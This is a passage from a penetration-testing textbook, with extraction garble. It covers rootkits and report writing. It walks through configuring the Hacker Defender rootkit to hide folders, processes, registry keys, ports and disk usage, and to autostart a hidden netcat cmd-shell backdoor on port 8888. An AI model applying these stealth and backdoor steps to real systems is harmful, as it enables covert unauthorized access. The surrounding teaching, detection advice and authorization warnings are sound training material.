 ROOTKITS Just like metasploit when people are first exposed to the power and cunning of  rootkits they are usually amazed
 to the uninitiated rootkits appear to have an  almost black-magic-like quality
 they are usually simple to install and can pro- duce amazing results
 running a rootkit gives you the ability to hide files pro- cesses and programs as if they were never installed on the computer
 rootkits  can be used to hide files from users and even the operating system itself
 Because rootkits are so effective at hiding files they will often be successful  at evading even the most finely tuned antivirus software
 the name rootkit is  typically said to be a derivative of the words e2809croote2809d as in root-level or admin- istrative access and the e2809ckite2809d or collection of tools that were provided by the  software package
 fIGURE 6
6 Netbus Client Software Used to Remotely Control the Target
 0cThe Basics of hacking and penetration Testing 136 As we already mentioned rootkits are extremely stealthy
 they can be used  for a variety of purposes including escalating privileges recording keystrokes  installing backdoors and other nefarious tasks
 many rootkits are able to avoid  detection because they operate at a much lower level of the operating system  itself inside the kernel
 the software that users typically interact with func- tions at a higher level of the system
 when a piece of software like antivirus  needs to perform a particular task it will often pass the request off to the lower  levels of the operating system to complete the task
 remember some rootkits  live deep inside the operating system
 they can also work by e2809chookinge2809d or  intercepting these various calls between the software and operating system
 By hooking the request from a piece of software the rootkit is able to modify  the normal response
 consider the following example: assume that you want  to see what processes are running on a windows machine
 to accomplish this  most users will depress the key combination e2809ccntlee80b1Altee80b1del
e2809d this will  allow the user to start the task manager and view running processes and ser- vices
 most people perform this task without thinking about it
 they examine  the process list presented and move on
 while the following is a gross oversimplification it should serve as an example  to help you understand the basics
 in this case software is making a call to the  operating system and asking what processes or services are running
 the oper- ating system queries all the running programs it is aware of and returns the  list
 However if we add a rootkit to the mix things get a little more compli- cated
 Because rootkits have the ability to intercept and modify the responses  returned by the operating system when a user attempts to view the process list  the rootkit can simply remove selected programs services and processes from  the list
 this happens instantaneously and the user is not aware of any differ- ences
 the program itself is actually functioning perfectly
 it is reporting exactly  what it was told by the operating system
 in many senses of the word the root- kit is causing the operating system to lie
 it is important to point out that a rootkit is not an exploit
 rootkits are some- thing that is uploaded to a system after the system has been exploited
 rootkits  are usually used to hide files or programs and maintain stealthy backdoor  access
 ALERT! As with everything else and even more so in this case you must be 100 percent sure  that your client authorizes the use of rootkits before you deploy them in a penetration  test
 Utilizing a rootkit without authorization will be a sure way to quickly end your  career and put you behind bars
 Even if you have been fully authorized to conduct a  penetration test double and triple check that you are specifically authorized to utilize   a rootkit
 0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 137 hacker Defender: It Is Not What you Think first things first; do not let the name fool you Hacker defender is a rootkit
 it  is not a way to defend hackers! Hacker defender is a full-fledged rootkit that  is relatively easy to understand and configure
 there are three main files included with Hacker defender that you must be  aware of: hxdef100
exe hxdef100
ini and bdcli100
exe
 Although the 
zip  file will include several other files we will focus our attention on these three
  Hxdef100
exe is the executable file that runs Hacker defender on the target  machine
 Hxdef100
ini is the configuration file where we set up the options  we want to use and list the programs files or services that we want to hide
  Bdcli100
exe is the client software that is used to connect directly to Hacker  defendere28099s backdoor
 once you have uploaded the hsdef100
zip file to your target you will need to  unzip it
 to keep things as simple as possible it is best to create a single folder  on the root of the target drive
 for the purpose of this example we will create  a folder on the c:\\\\ drive called e2809crke2809d (for rootkit)
 All the files including the  hxdef100
zip and its uncompressed contents are placed into this single folder
  this will make it easier to keep track of the files provide a central location  to upload additional tools to and make hiding this central repository much  easier
 once you have unzipped the hxdef100 file you can begin configuring  Hacker defender by modifying the hxdef100
ini file
 once you open the 
ini file you will see a number of different sections
 each  major section begins with a name enclosed in a square bracket
 figure 6
7  shows an example of the default configuration file
 fIGURE 6
7 Screenshot of the hxdef100
ini Configuration File
 0cThe Basics of hacking and penetration Testing 138 As you can see in figure 6
7 there are several headings including [Hidden  table] [Hidden Processes] [root Processes] [Hidden services] and others
  You will also notice that Hacker defender configuration file includes a cou- ple of default entries
 these entries are used to hide the Hacker defender files  and built in backdoor so you do not have to modify these or make additional  changes
 notice too that the 
ini file supports the use of wildcards with the e2809c*e2809d  character
 in this case any file that starts with the letters hxdef will automati- cally be included in the list
 start at the top and work your way through each of the headings
 the first sec- tion is titled [Hidden table]
 Any files directories or folders listed under this  heading will be hidden from the explorer and file manager used by windows
  if you created a folder on the root of the drive as suggested earlier be sure  to list it here
 Building off of this previous example we will list e2809crke2809d in the  [Hidden table] section
 in the [Hidden Processes] section you list each of the processes or programs  you want to be concealed from the user
 each of the processes listed here will  be hidden from the local user when they view currently running processes with  the task manager
 As a nonmalicious example assume you want to hide the cal- culator program
 in this case you will need to list the calculator program under  the [Hidden Processes] section
 By adding calc
exe to the [Hidden Processes]  section the user will no longer be able to find or interact with the calculator  program
 once our rootkit is started as far as the user is concerned there is no  calculator program available on the computer
 the [root Processes] section is used to allow programs to interact with and  view the previously hidden folders and processes
 remember that in the pre- vious sections we were removing the computere28099s ability to detect see and  interact with various files and programs
 in this section we list any programs  that we want to have full control
 Any programs listed here will be allowed to  view and interact with programs on the system including those listed in the  [Hidden table] and [Hidden Processes] tab
 if you have any programs that will install as a service or run services like ftP  web servers backdoors etc
 you will need to list them in the [Hidden services]  section
 like each of the other sections the [Hidden services] section will hide  each of the listed services
 Again when interacting with the task manager any  program listed here will be concealed from the e2809cservicese2809d list
 You can use the [Hidden regkeys] to hide specific registry keys
 Almost all pro- grams create registry keys when they are installed or run on a computer
 the  [Hidden regkeys] section can be used to camouflage each of these keys
 You  will need to make sure that you list them all in order to avoid detection
 some instances require more granular control than simply hiding the entire  key
 if an entire key is missing (or hidden) a keen system administrator may  get suspicious
 to handle these instances Hacker defender allows us to use  0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 139 the [Hidden regValues]
 entering information here will hide individual values  rather than the entire key
 the [startup run] is a list of programs that will be automatically run once  Hacker defender has been started
 this would be a good place to list the  netcat command if you were interested in creating a backdoor
 Just make sure  you put it in listener mode! Just as installing programs on a windows machine automatically creates regis- try keys and values installing programs onto a target requires disk drive space
  Here again a cunning administrator may notice if you install a program that  requires lot of disk space
 if a user starts his or her computer one morning and  discovers that over half of the hard drive space is suddenly in use he or she  will probably become suspicious
 You can use the [free space] section to force  the computer to e2809cadd backe2809d the amount of free space that you used
 entering  a number here will force the computer to report the actual available free space  plus the number you enter in this section
 in other words if you install a pro- gram that requires 1 gB of free space you should add 1073741824 under the  [free space] heading
 doing so will lessen the likelihood of discovery
 Please  note this number is listed in bytes
 if you need help in converting from bytes  to kilobytes to megabytes to gigabytes there are several good calculators avail- able online
 simply google e2809ckilobytes to megabytes calculatore2809d and use one of  the suggested pages returned
 if you know of ports that you plan to open you can list them under the  [Hidden Ports] section
 You will notice this section is further divided with the  following entries: tcPi: tcPo UdP
 the e2809ctcPi:e2809d subsection is where you list  any inbound ports that you want hidden
 if you have multiple ports to list  simply separate them by a comma
 e2809ctcPo:e2809d is a section where you list any out- bound tcP ports that you want to be hidden from the user
 the e2809cUdP:e2809d sec- tion is used to specify any UdP ports that you want concealed
 now that you have an idea of how to configure the basic Hacker defender   settings let us examine the tool in action
 for this example we will install  Hacker defender in a folder on the c:\\\\ drive called e2809crk
e2809d we will also place a  copy of netcat into this folder
 figure 6
8 shows an example of the 
ini configu- ration file
 You will notice that only a few extra lines have been added to the default   configuration file
 in this example we have added the e2809crke2809d folder to the  [Hidden table] section the netcat executable to the [Hidden Processes] sec- tion and lastly set up netcat to automatically start up in server mode and   provide a cmd shell on port 8888 of the target
 if you wanted to add an   additional layer of stealth you could also add 8888 to the [Hidden Ports]  section
 figure 6
9 shows two screenshots prior to starting Hacker defender
 notice that  both the e2809crke2809d folder and the netcat (nc
exe) program are visible
 0cThe Basics of hacking and penetration Testing 140 However once the hxdef100
exe file has been executed the rootkit is in full  force
 figure 6
10 demonstrates that neither the e2809crke2809d folder nor the e2809cnc
exee2809d  program is visible to the user
 As you can see even a simple rootkit like Hacker defender is quite capable of  masking and hiding files
 rootkits are a vast topic and we could easily dedicate  fIGURE 6
9 Prior to Running the Rootkit Both Folder and Program Are Visible
 fIGURE 6
8 Newly Configured hxdef100
ini File
 0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 141 an entire book to the technical details and their makeup and inner workings
  rootkit technology like all malware continues to develop at a staggering pace
  in order to truly master rootkits you will need to begin with a solid under- standing of the operating system kernel
 once you finish covering the basics  you are highly encouraged to dive into the malware rabbit hole and see just  how deep it goes
 DETECTING AND DEfENDING AGAINST ROOTKITS let us break from the normal convention of this book and take a minute to  discuss a few defensive strategies for dealing with rootkits
 Because we are  focusing on the basics defending against many of the techniques covered in  the earlier step has been quite simple: n closely monitor the information you put onto the internet
 n Properly configure your firewall and other access control lists
 n Patch your systems
 n install and use antivirus software
 n make use of an intrusion detection system
 Although the list is not nearly complete it is a good starting point for defend- ing systems
 However even with all of those processes in place rootkits can  still pose a danger
 defending against and detecting rootkits takes a few extra steps
 it is impor- tant to understand that in order to configure and install a rootkit adminis- trative access is required
 so the first step in avoiding rootkits is to deprivilege  your users
 it is not uncommon to find networks that are loaded with windows  fIGURE 6
10 After Running the Rootkit Both Folder and Program Are Invisible
 0cThe Basics of hacking and penetration Testing 142 machines where every user is a member of the administrator group
 Usually  when inquiring as to why every user is an administrator the system admins sim- ply just shrug or provide some lame excuse about the user needing to be admin- istrators to run a particular piece of software
 really? come on this is not 1998
  there are very few legitimate reasons for allowing your users to run around with  full admin rights
 with most modern operating systems you have the ability to  temporarily elevate your privileges with the e2809csue2809d or e2809crun Ase2809d commands
 Although it is true that many rootkits function at the kernel level and have the  ability to avoid detection by antivirus software installing using and keeping the  software up-to-date is critical
 some rootkits especially the older and less sophis- ticated versions can be detected and cleaned by modern antivirus software
 monitor the traffic coming into and going out of your network
 many adminis- trators are great at monitoring and blocking traffic as it flows into the network
  they spend days and even weeks honing their rule sets to block incoming traf- fic
 At the same time many of these admins completely ignore all outbound  traffic
 they become so focused on the incoming traffic that they forget to  watch what is leaving
 monitoring outbound traffic can be vital in detecting  rootkits and other malware
 Another good tactic for detecting rootkits and backdoors is to regularly port  scans your systems
 make note of each open port on each of your systems
 if  you find a system with an unknown port open be sure to track down the Pc  and identify the rogue service
 tools like rootkit revealer Vice and f-securee28099s Blacklight are some great free  options for revealing the presence of hidden files and rootkits
 Unfortunately  once a rootkit has been installed it can be very difficult to remove or at least  to remove completely
 sometimes rootkit removal requires you to boot your  machine into an alternate operating system and mount your original hard  drive
 By booting your machine to an alternate operating system or mounting  the drive to another machine you can scan the drive more thoroughly
 Because  the original operating system will not be running and your scanner will not be  using APi calls to an infected system it is more likely you will be able to dis- cover and remove the rootkit
 even with all of this oftentimes your best bet is  to simply wipe the system including a full format and start over
 hOW DO I pRACTICE ThIS STEp? like each of the steps that have been discussed becoming proficient with  backdoors and rootkits requires practice
 working with tools like netcat can  seem a bit confusing at first especially when we use the e2809c-ee2809d switch to provide  backdoor functionality
 the best way to practice this technique is to set up two  machines and practice implementing netcat between them
 the more you use  netcat the more comfortable you will become with the concept
 You should practice both sending and receiving files from each machine
 it  is important to understand directionality and exactly how to use netcat to  0cMaintaining Access with Backdoors and Rootkits  ChApTER 6 143 perform this task both ways (download and uploading)
 once the basics of  sending and receiving files have been mastered begin focusing on using netcat  as a backdoor
 remember the e2809c-ee2809d switch is vital in performing this task
 fully  understanding how to implement netcat as a backdoor will require setting up  the tool in listener mode on the target and making a connection to it from the  attacker machine
 Be sure to practice setting up a backdoor and establishing a connection with  both linux and windows
 it is important to master the difference between the  linux and windows versions
 remember a windows netcat version can con- nect to a linux version and vice versa; however there are several minor differ- ences in the switches and functionality of each program
 finally after becoming proficient with the basics of netcat be sure to explore  some advanced features like using netcat as a proxy reverse shells port scan- ning creating and copying a disk partition image and chaining netcat instances  together to bounce traffic from one machine to another
 Before wrapping up netcat be sure to thoroughly review the e2809cmane2809d pages and  examine each switch
 Again you will want to look closely at the differences  between the linux and windows versions
 examining the switches and reading  the e2809cmane2809d pages often provides additional information and can spur some cre- ative uses of the tool
 Practicing with rootkits can be a bit of a double-edged sword
 exploring and  learning to use rootkits can be rewarding and valuable but as with all malware  there is certainly some risk involved
 Anytime malware is used or studied there  is a chance that the malware will escape or infect the host system
 readers are  strongly encouraged to exercise extreme caution before downloading or install- ing any type of malware
 Advanced malware and rootkit analysis is beyond the  scope of this book and is not recommended
 if you are still compelled to study these topics the use of a sandboxed envi- ronment and virtual machines is a must
 Always disconnect all outside access  before proceeding to ensure that nothing escapes your network
 remember  that you are legally responsible for any and all traffic that leaves your network
  the laws that govern computer use at the federal and state levels make no dis- tinction between traffic that e2809caccidentallye2809d leaves your network and traffic that  is sent on purpose
 in reality rootkits and backdoors are rarely used in a penetration test
 it is  highly suggested that you focus on mastering each of the other steps before  attempting to advance any further with malware
 WhERE DO I GO fROM hERE? After mastering the basics of backdoors and rootkits you should expand your  horizon by exploring similar tools including ncat and socat
 ncat is a modern- ized version of the original netcat tool and is included as part of the nmap  0cThe Basics of hacking and penetration Testing 144 project
 ncat improves on the original tool by including many of the original  features plus ssl and iPv6 support
 socat is another close netcat relative that  is great for reading and writing network traffic
 socat also extends the origi- nal functionality of netcat by adding support for ssl iPv6 and several other  advanced features
 if you are interested in learning more about backdoors you should spend time  exploring a couple of classic examples including Back orifice and subseven  (sub7)
 Back orifice is similar in nature to netbus and allows a user to com- mand and control a remote machine
 the program was originally released  by sir dystic in 1998
 You can listen to the original talk titled e2809ccult of the  dead cow: the announcement of Back orfice directxploit and the modular  ButtPlugins for Boe2809d by reviewing the defcon 6 media archives
 sub7 was originally released in 1999 by mobman and functions in a client/ server manner similar to netbus and Back orifice
 like each of the other tools  discussed in this chapter sub7 is software that allows a client to remotely con- trol a server
 one interesting point about sub7 is the fact that after a six-year  hiatus where no development occurred the project was revived and updated
 if you are interested in expanding your knowledge of rootkits it is important  to study and master the inner workings of modern operating systems
 learning  the intricate details of an operating system kernel may seem daunting at first  but it is well worth your time
 this chapter examined the Hacker defender rootkit and provided a basic over- view of the functionality and use of rootkits
 it is important to understand that  this material only scratches the surface of rootkits
 Advanced topics include  hooking system and function calls and understanding the difference between  user-mode and kernel-mode kits
 developing a solid grasp of system program- ming and programming languages can be extremely beneficial as well
 SUMMARy this chapter focused on the use and implementation of backdoors and root- kits
 remember it is vital that you have proper authorization before utilizing  a rootkit or backdoor in a penetration test
 this chapter began by introduc- ing the powerful and flexible tool netcat
 several uses of netcat including  implementing netcat as a backdoor are covered
 cryptcat a modern version  of netcat with the added ability to encrypt traffic between two machines was  also discussed
 the classic remote control program netbus was introduced to  demonstrate the power of e2809ccommand and controle2809d software
 the chapter con- cluded with a brief overview of rootkits including their basic structure and use
  specifically the proper use configuration and implementation of the Hacker  defender rootkit was covered
 0c145 INTRODUCTION many people assume that once you have completed each of the four steps out- lined in chapters 2e280936 on your target the penetration test is over
 many new- comers also assume that immediately following step 4 you can simply call the  client to discuss your findings or maybe even just send the client a bill for your  services
 Unfortunately that is not the case
 the reality is that once you wrap  up the technical details of a penetration test there is still one task remaining
  After all of the reconnaissance scanning exploitation and maintaining access  is complete you need to summarize your findings in the form of a penetration  testing report
 it is not uncommon to find extremely gifted hackers and penetration testers  who want to completely ignore this phase
 these people have the skill and the  ability to compromise nearly any network but they lack the skills to commu- nicate the vulnerabilities exploits and mitigations to the client
 in many respects writing the penetration testing report is one of the most criti- cal tasks that an ethical hacker performs
 it is important to remember that in  many cases the better you do your job as a penetration tester the less your cli- ent will actually notice or e2809cfeele2809d your work
 As a result the final report is often  the only tangible evidence that a client will receive from the penetration tester  and the Pt process
 Wrapping Up the  penetration Test ChApTER 7 Information in This Chapter: n Writing the Penetration Testing Report n You Do Not Have to Go Home But You Cannot Stay Here n Where Do I Go From Here? n Wrap Up n The Circle of Life 0cThe Basics of hacking and penetration Testing 146 the penetration testing report often becomes the face of your organization  and reputation
 once the initial contract has been signed providing scope and  authorization the penetration tester often disappears from the target organiza- tion
 the test itself occurs in a relatively isolated environment
 once the test is  completed it is critical that the penetration tester present his or her findings  in a well thought-out organized and easy-to-understand manner
 Again it is  important to remember that in most cases the target organization (the com- pany that is paying you) has no concept of what you have been doing or how  many hours you have put into the task
 As a result the penetration testing  report becomes the principal reflection of your competence
 You have a respon- sibility to the client to present your findings but you also have an opportunity  to showcase your talent and explain how you spent the cliente28099s time and money  wisely
 do not underestimate the power or importance of this phase
 in reality often- times your perceived efforts and success will be judged based more on your  report than your actual success or failure to compromise a network
 Ultimately  the ability to write a good penetration testing report will win you repeat  business
 WRITING ThE pENETRATION TESTING REpORT like every other topic we have discussed writing a good penetration test- ing report takes practice
 many penetration testers mistakenly think that they  can simply provide the raw output from the tools that they run
 this group of  people will often collect and neatly organize the various outputs into a single  report
 they will gather any pertinent information from the reconnaissance  phase and include it along with the output from nmap and nessus
 many of the tools we discussed in this book include a reporting engine
 for  example nessus has several prebuilt reports that can be generated based off of  the scan
 Unfortunately using the prebuilt reports is not enough
 each report  must be well laid out and flow as a single document
 combining one style of  report from nessus with a different style of report from nmap or metasploit  will make the penetration test report appear disjointed and unorganized
 with that being said it is important to provide the detailed output from each  of your tools
 not many of your clients will have the ability to understand the  technical output from nmap or nessus; however remember the data does  belong to the client and it is important that they have access to the raw data
 we have covered several examples of what not to do in a penetration test- ing report; let us look at it from a different angle and discuss what should  be done
 first and foremost the penetration testing report needs to be broken into  several individual pieces
 taken together these pieces will form your overall  report but each piece should work as a stand-alone report as well
 0cWrapping Up the penetration Test ChApTER 7 147 At a minimum a well-rounded and presented penetration testing report should  include the following: 1
 An executive summary 2
 A detailed report 3
 raw output Executive Summary the executive summary should be a very brief overview of your major findings
  this document or subreport should not exceed two pages in length and only  include the highlights of the penetration test
 the executive summary does not  provide technical details or terminology
 this report needs to be written in the  context of board members and nontechnical management so that they can  understand your findings and any major concerns you discovered on the net- work and systems
 if vulnerability and exploits were discovered the executive summary needs  to focus on explaining how these findings impact the business
 the executive  summary should provide links and references to the detailed report so that  interested parties can review the technical nature of the findings
 it is impor- tant to remember that the executive summary must be very brief and written  at a high level
 most executive summaries should be written in such a way that  that the report writere28099s own grandmother would be able to understand what  occurred during the penetration test and what the major findings were
 Detailed Report the second part in a well-rounded penetration testing report is the detailed  report
 this report will include a comprehensive list of your findings as well  as the technical details
 the audience for this report includes it managers  security experts network administrators and others who possess the skills  and knowledge required to read and comprehend its technical nature
 in most  cases this report will be used by the technical staff to understand the details of  what your test uncovered and how to address or fix these issues
 As with every facet of the penetration test it is important to be honest and  direct with the client
 Although it may be tempting to emphasize your great  technical savvy and discuss how you owned a particular service it is much more  important to present the facts to your client beginning with the issues that pose  the most danger to their networks and systems
 ranking the discovered vulnera- bilities can be confusing and daunting for a new penetration tester luckily most  tools like nessus will provide you with a default ranking system
 Always present  critical findings first
 this makes your penetration test easier to read and allows  the client to read about and take action on the most serious findings first (with- out having to dig through 50 pages of technical output)
 Because it is important it needs to be stated again it is imperative that you put  the needs of the client before your ego
 consider the following example: assume  0cThe Basics of hacking and penetration Testing 148 you are conducting a penetration test and are able to fully compromise a server  on your targete28099s network
 However after further investigation and review you  determine that the newly compromised system is of no value
 that is it holds  no data is not connected to any other systems and cannot be used to gain  further access to the network
 later in the penetration test one of your tools  reports a critical vulnerability on a boarder router
 Unfortunately even after  having read the details of the vulnerability and running several tools you are  unable to exploit the weakness and gain access to the system
 even though you  are unable to gain access to the boarder router you are certain that the system  is vulnerable
 You also know that because this device is a boarder router if it is  compromised the entire network will be at risk
 of course it should go without saying that in this example both of these flaws  should be reported
 However the point is that in this case one flaw clearly  presents more danger than the other
 in this situation many newcomers may  be tempted to showcase their technical skills and successes by emphasizing  the fact that they were able to successfully compromise a server and downplay  the importance of the critical vulnerability because the penetration tester was  unable to exploit it
 never put yourself or your ego above the security of your  clients
 do not overstate the facts; simply report your findings to the best of your  ability in an objective manner
 let them make subjective decisions with the data  you provide
 never make up or falsify data in a penetration test
 never reuse  e2809cproof-of-concepte2809d screenshots
 it can be tempting to take shortcuts by supply- ing generic reusable proofs but it is a dangerous and unethical thing to do
 the idea and use of proof-of-concept screenshots is a powerful tool and should  be incorporated into the penetration testing report whenever possible
 Anytime  you discover a major finding or successfully complete an exploit you should  include a screenshot in the detailed report
 this will serve as undeniable evi- dence and provide the reader with a visualization of your success
 it is also good to remember especially when you first start conducting penetra- tion tests that not every Pt will result in a e2809cwine2809d or the successful compromise  of your target
 in most situations the penetration test is bound by some artifi- cial rules that reduce the reality of the test
 these include the demands imposed  by the client such as scope time and budget as well as the legal and ethical  restrictions that help define the boundaries of a penetration test
 As you prog- ress in your penetration testing career you will undoubtedly encounter situa- tions where your penetration test turns up completely blank no vulnerabilities  no weaknesses no useful information gathered etc
 in these situations you  still need to complete the penetration testing report
 in these situations the raw  tool output will provide the bulk of your report
 whenever possible when writing the detailed penetration testing report you  should include mitigations and suggestions for addressing the issues you dis- covered
 some tools like nessus will provide suggested mitigations
 if your  tools do not provide precanned mitigations then it is important that you  locate potential solutions on your own
 if you are unsure of where to look for  0cWrapping Up the penetration Test ChApTER 7 149 these solutions most public exploits and vulnerabilities include details or steps  that can be taken to address the weakness
 Use google and the internet to track  down specifics of the reported weaknesses
 By reviewing the technical details of  a vulnerability you will often find potential solutions
 these typically include  downloading a patch or upgrading to a newer version of the software although  they may discuss other resolutions such as configuration changes or hardware  upgrades
 Providing solutions to each of the problems you discover is a vital part of the  detailed report
 it will also serve to win you repeat business and help to distin- guish yourself from other penetration testers
 the findings in the detailed report should also include links and references to  specific pages in the raw output section
 this is important because it will save  you time and confused phone calls from your clients who are wondering how  you discovered a particular issue
 Providing clear references to the raw tool out- put will allow the client to dig into the details without needing to contact you
  in this manner you should be able to see how the report flows from executive  summary to detailed summary to raw output
 Raw Output the final portion of the report should be the technical details and raw out- put from each of the tools
 in reality not every penetration tester will agree  that this information needs to be included with the penetration testing report
  there is some merit to the arguments against including this detailed informa- tion which includes the fact that this information is often hundreds of pages  in length and can be very difficult to read and review
 Another common argu- ment often repeated from fellow penetration testers is that providing this level  of detail is unnecessary and allows the client to see exactly what tools were run  to perform the penetration test
 if you are using custom tools scripts or other proprietary code to perform a  penetration test you may not want to reveal this type of information directly  to your client
 However in most cases it is usually safe to provide the direct  output of the tools used in the penetration test
 this is not to say that you need  to provide the detailed commands and switches that were used to run tools  like metasploit nmap or custom code but rather that you make the output of  those commands available
 if you are concerned about disclosing the specific  commands used to run your tools you may have to sanitize the raw output to  remove those commands and manually delete any other sensitive information  you do not want to be disclosed to the readers
 from the view point of a basic penetration test which typically includes each  of the tools we discussed in this book it would not be out of the question  to simply include all the raw output at the end of the report
 the reason for  this is simplee28094the tools and commands used to invoke each of the tools in a  basic penetration test are widely known and available
 there is no real point in  hiding or attempting to obfuscate this information
 Additionally as mentioned  0cThe Basics of hacking and penetration Testing 150 earlier including the detailed output and making clear references to it in the  detailed report will often save you time and phone calls from frustrated clients  who do not understand your findings
 whether you decide to include the raw data as an actual component of the  report or you decide to include it as a separate document is entirely up to you
  depending on the sheer size of this report you may want to simply include it  as a secondary or stand-alone report and not attach it directly with the execu- tive summary and the detailed reports
 Another consideration that needs to be given some careful thought is how  you will present your report to the client
 this is something that should be  discussed prior to the delivery of the report
 from a purely time-management  and resource standpoint it is often easiest to deliver the report as an electronic  document
 in the case where the client requests a paper copy you will need to  professionally print bind and mail the document to the client
 Be sure to send  the document via certified mail and always request a return receipt so you can  verify that the document was properly received
 if you have agreed to deliver the document electronically you will need to  ensure that the penetration testing report is encrypted and remains confiden- tial until it arrives in the cliente28099s hands
 remember a penetration testing report  often contains very sensitive information about the organization
 You must  ensure the information contained in the report remains private
 it would be  very embarrassing to have a report you created become public because you did  not take the basic measures needed to ensure confidentiality
 there are several easy ways of ensuring confidentiality
 You can use a tool  like 7zip to compress and add a password to the files
 A much better way of  encrypting a document is to use a tool like truecrypt to encrypt the docu- ments
 truecrypt is an easy-to-use program and can be downloaded for free  from: http://www
truecrypt
org
 regardless of what type of encryption or pro- tection scheme you use your client will need to use the same tool to decrypt  and view the files
 this is an arrangement that should be agreed upon before  the penetration test begins
 some of your clients may not understand even the  basics of cryptography
 As a result you may need to work with and train them  on the proper techniques needed to view your final report
 each section or individual subreport should be clearly labeled and should  begin on a new page
 Under the heading of each report it may be a good idea  to emphasize to the reader that the penetration test is only a snapshot in time
  the security of networks computers systems and software is dynamic
 threats  and vulnerabilities change at lightning speed
 As a result a system that appears  completely impenetrable today can be easily compromised tomorrow if a new  vulnerability is discovered
 As a way of indemnifying yourself against this rapid  change it is important to communicate that the results of the test are accu- rate as of the day you completed the assessment
 setting realistic client expecta- tions is important
 remember unless you fill a computer with concrete drop  0cWrapping Up the penetration Test ChApTER 7 151 it in the middle of the ocean and unplug it from the internet there is always  a chance that the system can be hacked by some unknown technique or new  0-day flaw
 finally take your time to prepare read reread and properly edit your report
  it is equally as important to provide a document that is technically accurate as  well as one that is free of spelling and grammar issues
 technical penetration  testing reports that contain grammar and spelling mistakes will indicate to your  client that you perform sloppy work and reflect negatively on you
 remember  the penetration testing report is a direct reflection of you and your ability
 in  many cases the report is the single output that your client will see from your  efforts
 You will be judged based on the level of its technical detail and findings  as well as its overall presentation and readability
 while you are reviewing your report for mistakes take some time to closely  review the detailed output from your various tools
 remember many of the  tools that we use are written by hackers with a sense of humor
 Unfortunately  hacker humor and the professional world do not always mesh
 when i first  started as penetration tester a colleague and i found ourselves in an embarrass- ing situation
 one of the tools that we were using had attempted to log into  a particular service several hundred times using the name e2809cPeter weiner
e2809d As  a result our professional-looking report was filled with examples of a not-so- professional user account belonging to Peter weiner
 it is not easy to go into a  boardroom full of professional suit-wearing executives and discuss your ficti- tious user named Peter weiner
 it is worth noting that in this case the mistake was 100 percent mine
 the  maker of the tool clearly discussed how to change this username in the con- figuration settings
 A more careful inspection of the reports would have caught  this before my presentation and given me time to correct it
 right or wrong your reputation as a penetration tester will have a direct cor- relation to the quality of the reports that you put out
 learning to craft a  well-written penetration test is critical for earning repeat customers and earn- ing future business
 it is always a good idea to have a sample report in hand
  many prospective clients will ask for a sample report before making a final  decision
 it is worth noting that a sample report should be just a sample
 it  should not include any actual data from a real customer
 never give a previous  cliente28099s report out as a sample as this could represent a massive violation of the  implied or contractual confidentiality between you and your client
 to wrap up the report writing phase it is worth mentioning that most clients  will expect you to be available after the report has been delivered
 Because of  the technical and detailed nature of the penetration testing process and report  you should expect to receive a few questions
 Here again taking time and  answering each question should be viewed as an opportunity to impress the  client and win future business rather than as an annoyance
 Ultimately good  customer service is worth its weight in gold and will often repay you 10-fold
  0cThe Basics of hacking and penetration Testing 152 naturally your willingness to work with a client and provide additional services  has to make business sense as well
 You are not required to e2809coverservicee2809d the  account and provide endless hours of free support but rather you need to find  a balance between providing exceptional customer service and healthy profits
 yOU DONe28099T hAvE TO GO hOME BUT yOU   CANe28099T STAy hERE Assuming you have read the entire book (congrats by the way!) you are prob- ably wondering e2809cwhate28099s next?e2809d the answer to that question depends entirely  on you
 first it is suggested that you practice and master the basic informa- tion and techniques presented in this book
 once you are comfortable with the  basics move onto the advanced topics and tools covered in the e2809cwhere do i  go from Heree2809d section of each chapter
 After mastering all the material in this book you should have a solid under- standing of the hacking and penetration testing process
 You should feel  comfortable enough with the basic information that you are able to take on  advanced topics and even specialize
 it is worth noting however that there is much more to hacking and penetra- tion testing than just running tools
 there are entire communities out there  that are built around these topics
 You should become active in these com- munities
 introduce yourself and learn by asking questions and observing
 You  should give back to these communities whenever possible
 Hacking security  and penetration testing communities are available through various websites  online forums icQ mailing lists and news groups and even in person
 chat rooms are a great place to learn more about security
 chat rooms are usu- ally highly focused on a single topic and as the name implies typically involve  lots of communication over a wide variety of subtopics pertaining to the over- all theme of the room
 in many respects a chat room is like sitting at a bar and  listening to the conversations around you
 You can participate by asking ques- tions or simply by sitting quietly and reading the conversations of everyone in  the room
 if you have never been to a security conference (also known as a e2809ccone2809d) you  owe it to yourself to go
 defcon is an annual hacker convention held in las  Vegas at the end of each summer
 Yes it is a bit of a circus yes there are more  than 11000 people attending and yes it is hot in las Vegas in August
 But  despite all that defcon remains one of the single best security communities  on earth
 in general the crowds are very pleasant the goons (official defcon  workers) are friendly and helpful and the community is open and inviting
 the  price of admission is peanuts compared to some of the other security events  and one more thinge28094the talks are amazing
 the quality and variety of talks at defcon are nothing short of mind boggling
  talks vary each year but they are sure to include the topics of network hacking  web app security physical security hardware hacking lock picking and many  0cWrapping Up the penetration Test ChApTER 7 153 more
 the speakers are not only approachable more often than not they are  willing to take time and talk to you answering your questions one on one
 it  is consistently amazing how approachable and helpful con speakers are
 it  is natural to be a little nervous when approaching someone at a conference  especially if you have been part of an online community where e2809cnewbiese2809d are  put down and questions are discouraged; however if you take the initiative  you will often be pleasantly surprised by the openness of the entire defcon  community
 if you cannot make it to the official defcon conference you should try to  get involved in other security communities that are closer to you
 infragard  owAsP the Backtrack-linux forums and many others are great resources   for you
 reading this book and joining a security community are great ways to expand  your horizons and learn additional and advanced security concepts
 following  a thread or seeing a talk will often spur an interest in a specific security topic
 once you have mastered the basics you can look at diving more deeply into a  particular area of security
 most people learn the basics then tend to special- ize in a particular area
 this is not something you have to choose today and  becoming specialized in a single area does not preclude you from becoming  specialized in other areas
 However in general most people tend to be highly  focused with an advanced knowledge in one or two areas of security
 the list  below is just a small sample of topics that you can specialize in
 it is not meant  to be all-inclusive but rather to provide you with a sample of the various areas  that require advanced training: n offensive security/ethical Hacking n web Application security n system security n reverse engineering n tool development n malware Analysis n defensive security n software security n digital forensics n wireless security WhERE DO I GO fROM hERE? After reading this book you may be hungry to learn more about a particular  topic step or technique that was discussed
 now that you have mastered the  basics there should be many additional doors open to you
 if you have truly  studied practiced and understood the basic material presented in this book  you are equipped to tackle more advanced training
 remember one of the main motivations for writing a book like this was not  to turn you into an elite hacker or penetration tester but rather to provide you  Openmirrors
com 0cThe Basics of hacking and penetration Testing 154 with a springboard for advancing your knowledge
